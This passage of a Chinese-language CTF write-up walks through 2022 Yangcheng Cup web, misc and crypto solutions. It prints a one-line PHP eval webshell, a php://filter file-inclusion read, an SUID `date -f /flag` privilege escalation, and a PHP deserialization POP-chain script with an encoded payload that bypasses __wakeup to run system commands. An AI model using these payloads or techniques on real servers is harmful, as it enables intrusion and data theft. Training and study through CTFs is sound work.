class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;create&quot;</span>,<span class="string">&quot;install&quot;</span>,<span class="string">&quot;pear&quot;</span>];</span><br><span class="line">         <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> False;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> True;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">fliter</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Noooo0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>非预期。Dirsearch扫一下发现他人上传的shell.php，利用file参数include+伪协议包含一下：</p><p><code>?file=php://filter/read=convert.base64-encode/resource=shell.php</code></p><p>base64解码得到源码：<code>&lt;?php @eval($_POST[a]);?&gt;</code></p><p>用蚁剑连接上，在根目录下发现flag，但是权限不够无法查看。</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code> 查看具有SUID权限的可执行文件，发现date命令可用，提权：</p><p><code>date -f /flag</code></p><p>在报错文字中获取flag内容。</p><p>​    </p><h3 id="Safepop"><a href="#Safepop" class="headerlink" title="Safepop"></a>Safepop</h3><blockquote><p>Wake up!Pop corn is not safe food,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t serialize me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line">    <span class="variable">$o</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pop</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;no pop&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>找反序列化pop链：</p><p><code>Test/getFlag() &lt;- A/__get($p) &lt;- B/__destruct()</code></p><p>由于类A存在过滤 <code>preg_match(&quot;/Test/&quot;,get_class($this-&gt;a))</code>，类A不能调类Test，利用上类Fun：</p><p><code>Fun/__call($f,$p)  &lt;- A/__get($p) &lt;- B/__destruct()</code></p><p>编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fun</span>:</span><br><span class="line">    private_func = <span class="string">&#x27;system&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    public_a = Fun()</span><br><span class="line">     </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    <span class="comment"># public_p = &#x27;ls /&#x27;</span></span><br><span class="line">    public_p = <span class="string">&#x27;cat /flag?&#x27;</span></span><br><span class="line">    public_a = A()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(quote(serialize(B())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O%3A1%3A%22B%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22Fun%22%3A1%3A%7Bs%3A9%3A%22%00Fun%00func%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A1%3A%22p%22%3Bs%3A10%3A%22cat%20/flag%3F%22%3B%7D</span></span><br></pre></td></tr></table></figure><p>由于类Fun有 <code>__wakeup()</code> 会清空 <code>private $func</code>，修改数字绕过 <code>__wakeup()</code>：</p><p><code>O%3A1%3A%22B%22%3A3%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22Fun%22%3A1%3A%7Bs%3A9%3A%22%00Fun%00func%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A1%3A%22p%22%3Bs%3A10%3A%22cat%20/flag%3F%22%3B%7D</code></p><p>传入pop参数得到flag。</p><p>​    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="where-is-secret"><a href="#where-is-secret" class="headerlink" title="where_is_secret"></a>where_is_secret</h3><blockquote><p>easy_misc</p></blockquote><p>一个vig.txt和一个zip压缩包，txt中文字</p><p><code>Naseu bybkjkl, O wt mna Wkkopwkja hl Qrkgeux Fasxtorr. Zdl Kaozbgj hksu oty fblz hhntyoxj wu tzphvq ku Nqnhbta, hgj pox Qupo geyiuna ago ixkj jhtpyhrhlw hu aak Nblyehg gntr. Nahkj pvwgu pl QBJ Vxwgr Zdbkyzhr, O jlxj ovfkkux zk ikojn fk 29.94 bpgmay-layrbtc vkocpggh jaoyrxt wz kgpphto uhc. Soxt E yxvas mna Ynyoptt wyfe, E dbrh pgbeax ekb mu yvfk pv Nqnhbta ah ha aak rpvk lyxyekxtp.aak lhlysvkj ez ZCDA@K1tz0frjo</code></p><p>使用<a href="https://guballa.de/vigenere-solver">在线维吉尼亚密码解密网站</a>解出明文：</p><p><code>Hello friends, I am the President of Ukraine Zelensky. The Russian army has just launched an attack on Ukraine, and the Kyiv airport has been controlled by the Russian army. Heard today is KFC Crazy Thursday, I need someone to bring me 29.94 finger-sucking original chicken as rations now. When I repel the Russian army, I will invite you to come to Ukraine to be the vice president.the password is GWHT@R1nd0yyds</code></p><p>用密码 <code>GWHT@R1nd0yyds</code> 解压zip，得到一张bmp图，根据比赛中期放的hint提示加密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">text</span>):</span><br><span class="line">    str_len = <span class="built_in">len</span>(text)</span><br><span class="line">    width = math.ceil(str_len ** <span class="number">0.5</span>)</span><br><span class="line">    im = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, width), <span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        index = <span class="built_in">ord</span>(i)</span><br><span class="line">        rgb = (<span class="number">0</span>, (index &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>, index &amp; <span class="number">0xFF</span>)</span><br><span class="line">        im.putpixel((x, y), rgb)</span><br><span class="line">        <span class="keyword">if</span> x == width - <span class="number">1</span>:</span><br><span class="line">            x = <span class="number">0</span></span><br><span class="line">            y += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> im</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;829962.txt&quot;</span>, encoding=<span class="string">&quot;gbk&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        all_text = f.read()</span><br><span class="line"></span><br><span class="line">        im = encode(all_text)</span><br><span class="line">        im.save(<span class="string">&quot;out.bmp&quot;</span>)</span><br></pre></td></tr></table></figure><p>通过爆破方法逆回原文本即可，发现原文为一本书，包含大量中文，还原时设置不输出中文，缩短运行时间：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">r&#x27;out.bmp&#x27;</span>)</span><br><span class="line">width, height = img.size</span><br><span class="line"></span><br><span class="line">text=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">x, y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">       r,g,b = img.getpixel((x,y))</span><br><span class="line">       <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">126</span>):</span><br><span class="line">           <span class="keyword">if</span> ((j &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>) == g <span class="keyword">and</span> j &amp; <span class="number">0xFF</span> == b:</span><br><span class="line">               text+=<span class="built_in">chr</span>(j)</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">pass</span></span><br><span class="line">       <span class="keyword">if</span> x == width - <span class="number">1</span>:</span><br><span class="line">           x = <span class="number">0</span></span><br><span class="line">           y += <span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x,y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">r&#x27;text.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(text)</span><br></pre></td></tr></table></figure><p>在得到的字符里，找到flag格式的且带有意义的字符，组成flag：<code>flag&#123;h1d3_1n_th3_p1ctur3&#125;</code>。</p><p>​    </p><h3 id="迷失幻境"><a href="#迷失幻境" class="headerlink" title="迷失幻境"></a>迷失幻境</h3><blockquote><p>走不出自责空间，沉溺于我们昨天，还能不能相见。</p></blockquote><p>用DiskGenius打开vmdk文件，在回收站发现一张可莉jpg图片和一张无文件类型后缀的幻境png图片，提取出来。</p><p>在“迷失幻境”夹子里有1张可莉jpg图片和100张一样的幻境png图片，前后相同图片的大小不同，尝试盲水印提取信息不成功，再尝试将幻境png大图与小图进行减（sub）操作，得到</p><p><img src="/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/solved.bmp" alt="solved" style="zoom:80%;"></p><p>key为 <code>可莉前来报道</code>。</p><p>回收站里可莉jpg图片存在备注信息 <code>猜不到，怎么想都猜不到吧。</code>，用outguess提取：</p><p><code>outguess -r keli.jpg -k &quot;可莉前来报道&quot; -t out.txt</code></p><p>得到flag：<code>DASCTF&#123;f473a6fd2de17a0c5794414b3905ebbe&#125;</code>。</p><p>​    </p><h3 id="签个到"><a href="#签个到" class="headerlink" title="签个到"></a>签个到</h3><blockquote><p>签个到，请注意，本次比赛所有 flag 提交时都只需要提交括号内的字符串，比如这个题的 flag 如果是 flag{xxx}, 您只需要提交 xxx 即可得分。</p></blockquote><p><code>ZMJTPM33TIGQTLMDTV4JXLYQTNMQTAOLTSGTRMOLZD2JPMOETIEQBZ3PTZ2U2===</code>，初看为base32，解码为乱码。</p><p><code>flag&#123;</code> 对应base32编码为 <code>MZWGCZ33</code>，故为rot13+base32，解码得 <code>flag&#123;5f3c029eac023481fbd8d5ad15b73b34&#125;</code>。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="LRSA"><a href="#LRSA" class="headerlink" title="LRSA"></a>LRSA</h3><blockquote><p>RSA and some other things</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPQ</span>(<span class="params">p,q</span>):</span><br><span class="line">    P=getPrime(<span class="number">2048</span>)</span><br><span class="line">    Q=getPrime(<span class="number">2048</span>)</span><br><span class="line">    t=(p*P-<span class="number">58</span>*P+q)%Q</span><br><span class="line">    <span class="keyword">assert</span> (isPrime(Q))</span><br><span class="line">    <span class="keyword">return</span> P,Q,t</span><br><span class="line"></span><br><span class="line">B=getRandomNBitInteger(<span class="number">11</span>)</span><br><span class="line">p=getPrime(B)</span><br><span class="line">q=getPrime(B)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">P,Q,t=getPQ(p,q)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;B=&quot;</span>,B)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P*P*Q=&quot;</span>,P*P*Q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P*Q*Q=&quot;</span>,P*Q*Q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;t=&quot;</span>,t)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br></pre></td></tr></table></figure></blockquote><p>$\gcd(P \cdot P \cdot Q,P \cdot Q \cdot Q)=P \cdot Q$，继而求得 $P$ 和 $Q$，又有 $t=(P \cdot(p-58)+q) \bmod Q$，构造格 $\begin{bmatrix} 1 &amp; P \newline 0 &amp; Q \end{bmatrix}$，利用LLL算法规约得到 $p-58$ 和 $q$ 值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">B = <span class="number">1023</span></span><br><span class="line">PPQ = <span class="number">17550772391048142376662352375650397168226219900284185133945819378595084615279414529115194246625188015626268312188291451580718399491413731583962229337205180301248556893326419027312533686033888462669675100382278716791450615542537581657011200868911872550652311318486382920999726120813916439522474691195194557657267042628374572411645371485995174777885120394234154274071083542059010253657420242098856699109476857347677270860654429688935924519805555787949683144015873225388396740487817155358042797286990338440987035608851331840925854381286767024584195081004360635842976624747610461507795755042915965483135990495921912997789567020652729777216671481467049291624343256152446367091568361258918212012737611001009003078023715854575413979603297947011959023398306612437250872299406744778763429172689675430968886613391356192380152315042387148665654062576525633130546454743040442444227245763939134967515614637300940642555367668537324892890004459521919887178391559206373513466653484926149453481758790663522317898916616435463486824881406198956479504970446076256447830689197409184703931842169195650953917594642601134810084247402051464584676932882503143409428970896718980446185114397748313655630266379123438583315809104543663538494519415242569480492899140190587129956835218417371308642212037424611690324353109931657289337536406499314388951678319136343913551598851601805737870217800009086551022197432448461112330252097447894028786035069710260561955740514091976513928307284531381150606428802334767412638213776730300093872457594524254858721551285338651364457529927871215183857169772407595348187949014442596356406144157105062291018215254440382214000573515515859668018846789551567310531570458316720877172632139481792680258388798439064221051325274383331521717987420093245521230610073103811158660291643007279940393509663374960353315388446956868294358252276964954745551655711981</span></span><br><span class="line">PQQ = <span class="number">17632503734712698604217167790453868045296303200715867263641257955056721075502316035280716025016839471684329988600978978424661087892466132185482035374940487837109552684763339574491378951189521258328752145077889261805000262141719400516584216130899437363088936913664419705248701787497332582188063869114908628807937049986360525010012039863210179017248132893824655341728382780250878156526086594253092249935304259986328308203344932540888448163430113818706295806406535364433801544858874357459282988110371175948011077595778123265914357153104206808258347815853145593128831233094769191889153762451880396333921190835200889266000562699392602082643298040136498839726733129090381507278582253125509943696419087708429546384313035073010683709744463087794325058122495375333875728593383803489271258323466068830034394348582326189840226236821974979834541554188673335151333713605570214286605391522582123096490317734786072061052604324131559447145448500381240146742679889154145555389449773359530020107821711994953950072547113428811855524572017820861579995449831880269151834230607863568992929328355995768974532894288752369127771516710199600449849031992434777962666440682129817924824151147427747882725858977273856311911431085373396551436319200582072164015150896425482384248479071434032953021738952688256364397405939276917210952583838731888536160866721278250628482428975748118973182256529453045184370543766401320261730361611365906347736001225775255350554164449014831203472238042057456969218316231699556466298168668958678855382462970622819417830000343573014265235688391542452769592096406400900187933156352226983897249981036555748543606676736274049188713348408983072484516372145496924391146241282884948724825393087105077360952770212959517318021248639012476095670769959011548699960423508352158455979906789927951812368185987838359200354730654103428077770839008773864604836807261909</span></span><br><span class="line">t = <span class="number">44</span></span><br><span class="line">c = <span class="number">4364802217291010807437827526073499188746160856656033054696031258814848127341094853323797303333741617649819892633013549917144139975939225893749114460910089509552261297408649636515368831194227006310835137628421405558641056278574098849091436284763725120659865442243245486345692476515256604820175726649516152356765363753262839864657243662645981385763738120585801720865252694204286145009527172990713740098977714337038793323846801300955225503801654258983911473974238212956519721447805792992654110642511482243273775873164502478594971816554268730722314333969932527553109979814408613177186842539860073028659812891580301154746</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">PQ = gcd(PPQ,PQQ)</span><br><span class="line">P = PPQ//PQ</span><br><span class="line">Q = PQQ//PQ</span><br><span class="line"><span class="built_in">print</span>(P)</span><br><span class="line"><span class="built_in">print</span>(Q)</span><br><span class="line"></span><br><span class="line">A = Matrix(ZZ,[[<span class="number">1</span>,P],[<span class="number">0</span>,Q]])</span><br><span class="line">x = A.LLL()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">p = -x+<span class="number">58</span></span><br><span class="line">q = (t-P*(p-<span class="number">58</span>))%Q</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;8f3djoj9wedj2_dkc903cwckckdk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EasyRsa"><a href="#EasyRsa" class="headerlink" title="EasyRsa"></a>EasyRsa</h3><blockquote><p>really easy rsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    n = <span class="built_in">int</span>(i)</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    m = c</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c = %s&#x27;</span> % (m)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>gcd测试发现output中的 $n$ 有素公因子 $p$，逆推还原 $m$ 即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">n = [<span class="number">65439077968397540989065489337415940784529269429684649365065378651353483030304843439003949649543376311871845618819107350646437252980144978447924976470943930075812834237368425374578215977641265884859875440799334807607478705932175148673160353577875890074101393042506714001617338265284910381849259298772642190619</span>,<span class="number">86843235426823545017422014398916780909062053456790256392304973548517489132984667679637386416948409930796162377844525829968317585749956057149930523547463230147376192820753802868362225137830225967953826475779047454555958271846035526319036389127587352017149417549187850782892924691511398536178090031958365483499</span>,<span class="number">57839320383142814687522363258949714784622321678585619281948174372461045134361003939684803510572969567182690634502610963365500727981041136988638273942465134797850643121827808482673619534240872593224537996099454035648829692386918230535360101064254854063175494150147494342652670585674593236663514793256521719547</span>,<span class="number">52668168898129361356420333177679019946307853075463961068071790653159090226904625885080236174231665178538405547828768043706515464922611051221394704678558922339886480247663138702481349098077291584992082414494275463670330534613607852999291645500391111597009868188974671249118213040057429113174377610094956993269</span>,<span 